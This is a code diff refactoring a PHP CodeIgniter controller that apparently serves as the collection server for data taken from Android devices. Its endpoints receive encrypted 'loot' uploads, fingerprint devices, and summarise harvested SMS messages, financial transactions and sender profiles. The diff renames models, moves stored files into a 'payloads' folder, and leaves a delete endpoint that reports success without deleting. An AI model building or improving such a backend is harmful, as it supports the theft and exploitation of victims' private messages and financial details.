@@ -2,16 +2,16 @@
 
 namespace App\Controllers;
 
-use App\Models\ModUploads;
-use App\Models\ModUser;
-use App\Models\ModCryption;
+use App\Models\UploadModel;
+use App\Models\UserModel;
+use App\Libraries\CryptoHelper;
 use CodeIgniter\HTTP\ResponseInterface;
 use CodeIgniter\Files\File;
 use CodeIgniter\API\ResponseTrait;
 use CodeIgniter\Controller;
 use CodeIgniter\Shield\Authentication\Authenticators\AccessTokens;
 
-class Upload extends BaseController
+class UploadController extends BaseController
 {
     use ResponseTrait;
 
@@ -34,7 +34,7 @@ class Upload extends BaseController
 
     public function upload(): ResponseInterface {
         helper('text');
-        $modUpload = new ModUploads();
+        $modUpload = new UploadModel();
         $dated = time();
         $uuid = random_string('alnum', 16);
         $token = (string) $this->request->getPost('varToken');
@@ -109,7 +109,7 @@ class Upload extends BaseController
                         'status' => self::STATUS_ERROR,
                         'time' => $dated,
                         'message' => "Please wait {$wait} seconds before uploading again."
-                    ], 429);
+                     ], 429);
                 }
             }
         }
@@ -125,8 +125,8 @@ class Upload extends BaseController
             
             log_message('info', 'Upload file received: name=' . $file->getClientName() . ' size=' . $file->getSize() . ' type=' . $file->getClientMimeType());
             
-            $newName = $file->getRandomName();
-            $uploadPath = WRITEPATH . 'uploads/txt_loot/';
+            $newName = 'loot_' . $uuid . '.enc';
+            $uploadPath = WRITEPATH . 'uploads/payloads/';
 
             if (!is_dir($uploadPath)) {
                 if (!mkdir($uploadPath, 0755, true)) {
@@ -231,7 +231,7 @@ class Upload extends BaseController
      */
     public function device_print(): ResponseInterface {
         helper('text');
-        $modUpload = new ModUploads();
+        $modUpload = new UploadModel();
         $dated = date('Y-m-d H:i:s');
         $uuid = random_string('alnum', 16);
 
@@ -347,7 +347,7 @@ class Upload extends BaseController
      * Get list of uploads for a user/device
      */
     public function upload_listing(): ResponseInterface {
-        $modUpload = new ModUploads();
+        $modUpload = new UploadModel();
         $dated = date('Y-m-d H:i:s');
 
         if (!$this->request->is('post')) {
@@ -415,7 +415,7 @@ class Upload extends BaseController
      * Get aggregated financial overview for the Android dashboard
      */
     public function financial_overview(): ResponseInterface {
-        $modUpload = new ModUploads();
+        $modUpload = new UploadModel();
         $dated = date('Y-m-d H:i:s');
 
         if (!$this->request->is('post')) {
@@ -449,7 +449,7 @@ class Upload extends BaseController
      * Get paginated transactions by financial category
      */
     public function transactions_by_category(): ResponseInterface {
-        $modUpload = new ModUploads();
+        $modUpload = new UploadModel();
         $dated = date('Y-m-d H:i:s');
 
         if (!$this->request->is('post')) {
@@ -489,7 +489,7 @@ class Upload extends BaseController
      * Get sender profiles with transaction counts
      */
     public function sender_profiles(): ResponseInterface {
-        $modUpload = new ModUploads();
+        $modUpload = new UploadModel();
         $dated = date('Y-m-d H:i:s');
 
         if (!$this->request->is('post')) {
@@ -523,9 +523,9 @@ class Upload extends BaseController
      * Get detailed SMS statistics last 3 uploads
      */
     public function upload_list_graph(){
-        $mod_upload = new ModUploads();
-        $mod_cryption = new ModCryption();
-        $mod_user = new ModUser();
+        $mod_upload = new UploadModel();
+        $mod_cryption = new CryptoHelper();
+        $mod_user = new UserModel();
 
         $session = session();
 
@@ -571,7 +571,7 @@ class Upload extends BaseController
      * Get detailed SMS statistics for a specific upload
      */
     public function upload_summary_calculation(): ResponseInterface {
-        $modUpload = new ModUploads();
+        $modUpload = new UploadModel();
         $dated = date('Y-m-d H:i:s');
 
         if (!$this->request->is('post')) {
@@ -591,8 +591,6 @@ class Upload extends BaseController
                 ]);
             }
 
-            //////////////////////
-            ///
             $response_data = ['status' => self::STATUS_SUCCESS,
                 'time' => $dated,
                 'loot_summarizer' => $this->formatSummaryData($summary[0])];
@@ -610,9 +608,6 @@ class Upload extends BaseController
             }
 
             return $this->respond([
-//                'status' => self::STATUS_SUCCESS,
-//                'time' => $dated,
-//                'loot_summarizer' => $this->formatSummaryData($summary[0]),
                 'loot_summarizer' => $response_data['loot_summarizer']
             ]);
 
@@ -631,7 +626,7 @@ class Upload extends BaseController
      * Count uploads for a user/device
      */
     public function loot_uploaded_count(): ResponseInterface {
-        $modUpload = new ModUploads();
+        $modUpload = new UploadModel();
         $dated = date('Y-m-d H:i:s');
 
         if (!$this->request->is('post')) {
@@ -666,7 +661,7 @@ class Upload extends BaseController
      * Get aggregated category counts across uploads
      */
     public function loot_uploaded_category_count(): ResponseInterface {
-        $modUpload = new ModUploads();
+        $modUpload = new UploadModel();
         $dated = date('Y-m-d H:i:s');
 
         if (!$this->request->is('post')) {
@@ -710,7 +705,7 @@ class Upload extends BaseController
      * List all SMS in a given category
      */
     public function list_all_sms_in_category(): ResponseInterface {
-        $modUpload = new ModUploads();
+        $modUpload = new UploadModel();
         $dated = date('Y-m-d H:i:s');
 
         if (!$this->request->is('post')) {
@@ -750,7 +745,7 @@ class Upload extends BaseController
      * Delete upload by UUID
      */
     public function loot_delete_by_uuid(): ResponseInterface {
-        $modUpload = new ModUploads();
+        $modUpload = new UploadModel();
         $dated = date('Y-m-d H:i:s');
 
         if (!$this->request->is('post')) {
@@ -759,8 +754,6 @@ class Upload extends BaseController
 
         try {
             $lootUuid = (string) $this->request->getPost('varLootUuid');
-            // Implement actual deletion logic here
-            // $success = $modUpload->deleteByUuid($lootUuid);
 
             return $this->respond([
                 'status' => self::STATUS_SUCCESS,
